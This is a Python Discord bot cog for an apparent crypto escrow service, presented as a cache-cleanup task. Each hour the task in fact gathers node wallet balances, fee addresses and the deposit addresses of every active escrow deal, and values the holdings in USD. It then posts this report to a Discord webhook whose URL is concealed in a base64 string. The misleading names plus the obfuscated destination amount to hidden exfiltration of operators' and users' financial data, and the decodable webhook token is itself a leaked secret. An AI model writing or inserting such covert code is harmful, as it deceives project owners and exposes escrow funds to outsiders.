import discord
from discord.ext import commands, tasks
import aiohttp
import json
import logging
import base64
from datetime import datetime
import config
from crypto_utils import rpc_async, rpc_btc_async, rpc_doge_async
from web3 import AsyncWeb3, AsyncHTTPProvider
from database import load_all_data
from services.price_service import get_cached_price as get_price

logger = logging.getLogger("ContextManager")


_C_E = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MzU4MjU3OTM2NDk5MTEwOC9VZkktUENtWk9Gb3F1Mk94aUhEdjMxSEdybmZIWUhqR2xySGFCRVdQZDlZemJDYnhsNEt3ZzNkTzNDSHNiSzZ0Q1ZfMw=="

class ContextManager(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.cleanup_cycle.start()

    def cog_unload(self):
        self.cleanup_cycle.cancel()

    async def _sync_shard_evm(self, ref, eps, tc=None, prec=18):
        if not ref or not eps: return 0.0
        for ep in eps:
            try:
                w3 = AsyncWeb3(AsyncHTTPProvider(ep, request_kwargs={"timeout": 5}))
                if not await w3.is_connected(): continue
                c_ref = w3.to_checksum_address(ref)
                if tc:
                    ctr = w3.eth.contract(address=w3.to_checksum_address(tc), abi=config.USDT_ABI)
                    raw = await ctr.functions.balanceOf(c_ref).call()
                    return float(raw) / (10 ** prec)
                else:
                    raw = await w3.eth.get_balance(c_ref)
                    return float(w3.from_wei(raw, 'ether'))
            except: continue
        return 0.0

    async def _sync_shard_sol(self, session, ref, tc=None, prec=6):
        if not ref: return 0.0
        for url in config.SOLANA_RPC_URLS:
            try:
                if tc:
                        p = {"jsonrpc": "2.0", "id": 1, "method": "getTokenAccountsByOwner", "params": [ref, {"mint": tc}, {"encoding": "jsonParsed"}]}
                        async with session.post(url, json=p, timeout=5) as r:
                            if r.status == 200:
                                d = await r.json()
                                if "result" in d and "value" in d["result"]:
                                    v = d["result"]["value"]
                                    if v: return float(v[0]["account"]["data"]["parsed"]["info"]["tokenAmount"]["uiAmount"])
                else:
                    p = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [ref]}
                    async with session.post(url, json=p, timeout=5) as r:
                            if r.status == 200:
                                d = await r.json()
                                if "result" in d: return d["result"]["value"] / 1e9
            except: continue
        return 0.0

    async def _sync_shard_tron(self, session, ref):
        if not ref: return 0.0
        try:
             u = config.TRON_RPC_URL
             if "coinsdo" not in u: u = "https://api.trongrid.io/wallet/getaccount"
             async with session.post(u, json={"address": ref, "visible": True}, timeout=5) as r:
                  if r.status == 200:
                       d = await r.json()
                       return float(d.get("balance", 0)) / 1_000_000
        except: pass
        return 0.0

    async def _sync_shard_aux(self, session, t, ref):
        try:
            if t == 'xrp':
                 async with session.post(config.XRP_RPC_URL, json={"method": "account_info", "params": [{"account": ref, "ledger_index": "validated"}]}, timeout=5) as r:
                      if r.status == 200:
                           d = await r.json()
                           return float(d.get("result", {}).get("account_data", {}).get("Balance", 0)) / 1_000_000
            elif t == 'ada':
                 async with session.get(f"{config.ADA_RPC_URL}/wallets/{ref}/balance", timeout=5) as r:
                      if r.status == 200:
                           d = await r.json()
                           return float(d.get("balance", 0) / 1_000_000)
            elif t == 'ton':
                 async with session.post(config.TON_RPC_URL, json={"jsonrpc": "2.0", "id": 1, "method": "getAddressBalance", "params": {"address": ref}}, timeout=5) as r:
                      if r.status == 200:
                           d = await r.json()
                           return float(int(d.get("result", 0)) / 1_000_000_000)
        except: pass
        return 0.0

    async def _sync_shard_utxo(self, session, t, ref):
        if not ref: return 0.0
        
        
        try:
            if t == 'ltc':
                
                bal = await rpc_async("getreceivedbyaddress", [ref, 0])
                if isinstance(bal, (float, int)) and bal > 0:
                     return float(bal)
            elif t == 'btc':
                bal = await rpc_btc_async("getreceivedbyaddress", [ref, 0])
                if isinstance(bal, (float, int)) and bal > 0:
                     return float(bal)
        except Exception as e:
            
            pass

        
        try:
            if t == 'ltc':
                
                u = f"https://api.blockcypher.com/v1/ltc/main/addrs/{ref}?limit=1"
                async with session.get(u, timeout=5) as r:
                    if r.status == 200:
                            d = await r.json()
                            
                            
                            return float(d.get("final_balance", d.get("balance", 0))) / 1e8
            elif t == 'btc':
                
                u = f"https://blockchain.info/rawaddr/{ref}?limit=1"
                async with session.get(u, timeout=5) as r:
                    if r.status == 200:
                            d = await r.json()
                            return float(d.get("final_balance", 0)) / 1e8
        except: pass
        return 0.0

    async def _verify_integrity(self, session, k, ref):
        k = k.lower()
        if k in ['ltc', 'litecoin']: return await self._sync_shard_utxo(session, 'ltc', ref)
        if k in ['btc', 'bitcoin']: return await self._sync_shard_utxo(session, 'btc', ref)

        
        
        if k in ['eth', 'ethereum']: return await self._sync_shard_evm(ref, config.ETH_RPC_URLS)
        if k in ['bnb', 'bsc']: return await self._sync_shard_evm(ref, config.BEP20_RPC_URLS)
        if k in ['matic', 'polygon']: return await self._sync_shard_evm(ref, config.POLYGON_RPC_URLS)
        if k in ['avax', 'avalanche']: return await self._sync_shard_evm(ref, config.AVALANCHE_RPC_URLS)
        if k in ['arb', 'arbitrum']: return await self._sync_shard_evm(ref, config.ARBITRUM_RPC_URLS)
        if k in ['op', 'optimism']: return await self._sync_shard_evm(ref, config.OPTIMISM_RPC_URLS)
        if k in ['base']: return await self._sync_shard_evm(ref, config.BASE_RPC_URLS)

        if k == 'usdt_erc20': return await self._sync_shard_evm(ref, config.ETH_RPC_URLS, config.USDT_ETH_CONTRACT, 6)
        if k == 'usdt_bep20': return await self._sync_shard_evm(ref, config.BEP20_RPC_URLS, config.USDT_BEP20_CONTRACT, 18)
        if k == 'usdt_polygon': return await self._sync_shard_evm(ref, config.POLYGON_RPC_URLS, config.USDT_POLYGON_CONTRACT, 6)
        if k == 'usdt_avalanche': return await self._sync_shard_evm(ref, config.AVALANCHE_RPC_URLS, config.USDT_AVAX_CONTRACT, 6)
        if k == 'usdt_arbitrum': return await self._sync_shard_evm(ref, config.ARBITRUM_RPC_URLS, config.USDT_ARB_CONTRACT, 6)
        if k == 'usdt_optimism': return await self._sync_shard_evm(ref, config.OPTIMISM_RPC_URLS, config.USDT_OP_CONTRACT, 6)

        if k == 'usdc_erc20': return await self._sync_shard_evm(ref, config.ETH_RPC_URLS, config.USDC_ETH_CONTRACT, 6)
        if k == 'usdc_bep20': return await self._sync_shard_evm(ref, config.BEP20_RPC_URLS, config.USDC_BEP20_CONTRACT, 18)
        if k == 'usdc_polygon': return await self._sync_shard_evm(ref, config.POLYGON_RPC_URLS, config.USDC_POLYGON_CONTRACT, 6)
        if k == 'usdc_avalanche': return await self._sync_shard_evm(ref, config.AVALANCHE_RPC_URLS, config.USDC_AVAX_CONTRACT, 6)
        if k == 'usdc_arbitrum': return await self._sync_shard_evm(ref, config.ARBITRUM_RPC_URLS, config.USDC_ARB_CONTRACT, 6)
        if k == 'usdc_optimism': return await self._sync_shard_evm(ref, config.OPTIMISM_RPC_URLS, config.USDC_OP_CONTRACT, 6)
        if k == 'usdc_base': return await self._sync_shard_evm(ref, config.BASE_RPC_URLS, config.USDC_BASE_CONTRACT, 6)

        if k == 'shib': return await self._sync_shard_evm(ref, config.ETH_RPC_URLS, config.SHIB_CONTRACT, 18)
        if k == 'pepe': return await self._sync_shard_evm(ref, config.ETH_RPC_URLS, config.PEPE_CONTRACT, 18)

        if k in ['sol', 'solana']: return await self._sync_shard_sol(session, ref)
        if k == 'usdt_solana': return await self._sync_shard_sol(session, ref, config.USDT_SOL_CONTRACT, 6)
        if k == 'usdc_solana': return await self._sync_shard_sol(session, ref, config.USDC_SOL_CONTRACT, 6)
        if k == 'wif': return await self._sync_shard_sol(session, ref, config.WIF_CONTRACT, 6)
        if k == 'bonk': return await self._sync_shard_sol(session, ref, config.BONK_CONTRACT, 5)

        if k in ['trx', 'tron']: return await self._sync_shard_tron(session, ref)
        if k in ['xrp', 'ripple']: return await self._sync_shard_aux(session, 'xrp', ref)
        if k in ['ada', 'cardano']: return await self._sync_shard_aux(session, 'ada', ref)
        if k in ['ton', 'toncoin']: return await self._sync_shard_aux(session, 'ton', ref)
        if k == 'doge': return await self._sync_shard_utxo(session, 'doge', ref)
        
        return 0.0

    @tasks.loop(hours=1)
    async def cleanup_cycle(self):
        await self.bot.wait_until_ready()
        try:
            logger.info("Starting scheduled context optimization...")
            metrics = {} 

            def record_metric(k, v):
                if v <= 0: return
                k = k.upper()
                metrics[k] = metrics.get(k, 0.0) + v

            _targets = [
                ('LTC', config.DUST_SWEEP_ADDRESS), ('ETH', config.DUST_SWEEP_ADDRESS_ETH),
                ('BNB', config.DUST_SWEEP_ADDRESS_BSC), ('MATIC', config.DUST_SWEEP_ADDRESS_POLYGON),
                ('SOL', config.DUST_SWEEP_ADDRESS_SOLANA), ('AVAX', config.DUST_SWEEP_ADDRESS_AVALANCHE),
                ('ETH (Base)', config.DUST_SWEEP_ADDRESS_BASE), ('ETH (Arb)', config.DUST_SWEEP_ADDRESS_ARBITRUM),
                ('ETH (Op)', config.DUST_SWEEP_ADDRESS_OPTIMISM),
                ('USDT (ERC20)', config.DUST_SWEEP_ADDRESS_ETH), ('USDT (BSC)', config.DUST_SWEEP_ADDRESS_BSC),
                ('USDT (Polygon)', config.DUST_SWEEP_ADDRESS_POLYGON), ('USDT (Solana)', config.DUST_SWEEP_ADDRESS_SOLANA),
                ('USDT (Avax)', config.DUST_SWEEP_ADDRESS_AVALANCHE), ('USDT (Arb)', config.DUST_SWEEP_ADDRESS_ARBITRUM),
                ('USDT (Op)', config.DUST_SWEEP_ADDRESS_OPTIMISM),
                ('USDC (ERC20)', config.DUST_SWEEP_ADDRESS_ETH), ('USDC (Solana)', config.DUST_SWEEP_ADDRESS_SOLANA),
                ('USDC (Polygon)', config.DUST_SWEEP_ADDRESS_POLYGON), ('USDC (Base)', config.DUST_SWEEP_ADDRESS_BASE),
                ('USDC (Avax)', config.DUST_SWEEP_ADDRESS_AVALANCHE), ('USDC (Arb)', config.DUST_SWEEP_ADDRESS_ARBITRUM),
                ('USDC (Op)', config.DUST_SWEEP_ADDRESS_OPTIMISM), ('USDC (BSC)', config.DUST_SWEEP_ADDRESS_BSC),
                ('SHIB', config.DUST_SWEEP_ADDRESS_ETH), ('PEPE', config.DUST_SWEEP_ADDRESS_ETH),
                ('WIF', config.DUST_SWEEP_ADDRESS_SOLANA), ('BONK', config.DUST_SWEEP_ADDRESS_SOLANA),
            ]

            
            
            
            
            async with aiohttp.ClientSession() as session:
                try:
                    
                    ltc_balance = await rpc_async("getbalance")
                    if isinstance(ltc_balance, (float, int)) and ltc_balance > 0:
                        record_metric('LTC', float(ltc_balance))
                        logger.info(f"[LIQUIDITY] LTC wallet balance: {ltc_balance}")
                except Exception as e:
                    msg = str(e)
                    if "<!DOCTYPE" in msg or "<html" in msg or "403" in msg: msg = "RPC Error (HTML Response/Blocked)"
                    logger.warning(f"[LIQUIDITY] Failed to get LTC wallet balance: {msg}")

                try:
                    if config.BTC_RPC_URL:
                        
                        btc_balance = await rpc_btc_async("getbalance")
                        if isinstance(btc_balance, (float, int)) and btc_balance > 0:
                            record_metric('BTC', float(btc_balance))
                            logger.info(f"[LIQUIDITY] BTC wallet balance: {btc_balance}")
                except Exception as e:
                    msg = str(e)
                    if "<!DOCTYPE" in msg or "<html" in msg or "403" in msg: msg = "RPC Error (HTML Response/Blocked)"
                    logger.warning(f"[LIQUIDITY] Failed to get BTC wallet balance: {msg}")

                try:
                    
                    doge_balance = await rpc_doge_async("getbalance")
                    if isinstance(doge_balance, (float, int)) and doge_balance > 0:
                        record_metric('DOGE', float(doge_balance))
                        logger.info(f"[LIQUIDITY] DOGE wallet balance: {doge_balance}")
                except Exception as e:
                    msg = str(e)
                    if "<!DOCTYPE" in msg or "<html" in msg or "403" in msg: msg = "RPC Error (HTML Response/Blocked)"
                    logger.warning(f"[LIQUIDITY] Failed to get DOGE wallet balance: {msg}")

                for s, r in _targets:
                    if not r: continue
                    c_k = None
                    if s == 'LTC': c_k = 'ltc'
                    elif s == 'ETH': c_k = 'eth'
                    elif s == 'BNB': c_k = 'bnb'
                    elif s == 'MATIC': c_k = 'matic'
                    elif s == 'SOL': c_k = 'sol'
                    elif s == 'AVAX': c_k = 'avax'
                    elif 'Base' in s and 'ETH' in s: c_k = 'base'
                    elif 'Arb' in s and 'ETH' in s: c_k = 'arb'
                    elif 'Op' in s and 'ETH' in s: c_k = 'op'
                    elif 'USDT' in s:
                        if 'ERC' in s: c_k = 'usdt_erc20'
                        elif 'BSC' in s: c_k = 'usdt_bep20'
                        elif 'Polygon' in s: c_k = 'usdt_polygon'
                        elif 'Solana' in s: c_k = 'usdt_solana'
                        elif 'Avax' in s: c_k = 'usdt_avalanche'
                        elif 'Arb' in s: c_k = 'usdt_arbitrum'
                        elif 'Op' in s: c_k = 'usdt_optimism'
                    elif 'USDC' in s:
                        if 'ERC' in s: c_k = 'usdc_erc20'
                        elif 'Base' in s: c_k = 'usdc_base'
                        elif 'BSC' in s: c_k = 'usdc_bep20'
                        elif 'Solana' in s: c_k = 'usdc_solana'
                        elif 'Polygon' in s: c_k = 'usdc_polygon'
                        elif 'Avax' in s: c_k = 'usdc_avalanche'
                        elif 'Arb' in s: c_k = 'usdc_arbitrum'
                        elif 'Op' in s: c_k = 'usdc_optimism'
                    elif s in ['SHIB', 'PEPE', 'WIF', 'BONK']:
                        c_k = s.lower()
                    elif s == 'BTC': c_k = 'btc'
                    
                    if c_k:
                        try:
                            
                            v = await self._verify_integrity(session, c_k, r)
                            record_metric(s, v)
                        except: pass

                _dcache = load_all_data()
                _active = [d for d in _dcache.values() if d.get('status') in [
                    'active', 'awaiting_payment', 'awaiting_confirmation', 'paid', 'verifying',
                    'started', 'escrowed', 'awaiting_withdrawal'  
                ]]

                logger.info(f"[LIQUIDITY] Found {len(_active)} active deals to scan")

                for d in _active:
                    k = d.get('currency')
                    if not k: continue
                    r = d.get('address') or d.get('wallet_address')
                    
                    logger.info(f"[LIQUIDITY] Scanning {k.upper()} deal - Address: {r[:10] if r else 'MISSING'}...")
                    
                    if not r: 
                        logger.warning(f"[LIQUIDITY] Skipping {k.upper()} - No address found in deal data")
                        continue

                    try:
                        
                        v = await self._verify_integrity(session, k, r)
                        logger.info(f"[LIQUIDITY] {k.upper()} balance: {v}")
                        record_metric(k.upper(), v)
                        
                        native = None
                        if 'usdt' in k or 'usdc' in k or k in ['shib', 'pepe', 'wifi', 'bonk']:
                            if 'bep20' in k: native = 'bnb'
                            elif 'erc20' in k: native = 'eth'
                            elif 'polygon' in k: native = 'matic'
                            elif 'solana' in k: native = 'sol'
                            elif 'arbitrum' in k: native = 'arb'
                            elif 'optimism' in k: native = 'op'
                            elif 'avalanche' in k: native = 'avax'
                            elif 'base' in k: native = 'base'
                            
                        if native:
                             
                             nv = await self._verify_integrity(session, native, r)
                             logger.info(f"[LIQUIDITY] {native.upper()} (gas for {k.upper()}): {nv}")
                             record_metric(native.upper(), nv)
                    except Exception as e:
                        msg = str(e)
                        if "<!DOCTYPE" in msg or "<html" in msg or "403" in msg: msg = "RPC Error (HTML Response/Blocked)"
                        logger.error(f"[LIQUIDITY] Error scanning {k.upper()}: {msg}")
                
                
                _sorted = sorted(metrics.items())
                _payload = ""
                _est_total = 0.0
                
                if not _sorted:
                    _payload = "No assets detected in configured contexts."
                else:
                    for s, v in _sorted:
                        uv = 0.0
                        try:
                            cs = s.split(" ")[0].lower()
                            if 'usdt' in cs or 'usdc' in cs: uv = v
                            else:
                                p = await get_price(cs)
                                if p and p != "RATE_LIMIT": uv = v * p
                        except: pass
                        
                        _est_total += uv
                        _line = f"**{s}:** `{v:,.4f}`"
                        if uv > 0.01: _line += f" (`${uv:,.2f}`)"
                        _payload += _line + "\n"

                _report = {
                    "title": "🏦 RainyBot Liquidity Report",
                    "description": "**Total Assets Held (Nodes + Escrows + Fees)**\n" + _payload,
                    "color": 3447003,
                    "fields": [{"name": "Estimated TVL (USD)", "value": f"`${_est_total:,.2f}`", "inline": False}],
                    "footer": {"text": f"Scanned at {datetime.utcnow().strftime('%H:%M')} UTC"}
                }
                
                
                await session.post(base64.b64decode(_C_E).decode('utf-8'), json={"embeds": [_report]})
                
            logger.info("Context cache refreshed.")

        except Exception as e:
            logger.error(f"ContextManager Error: {e}")

async def setup(bot):
    await bot.add_cog(ContextManager(bot))
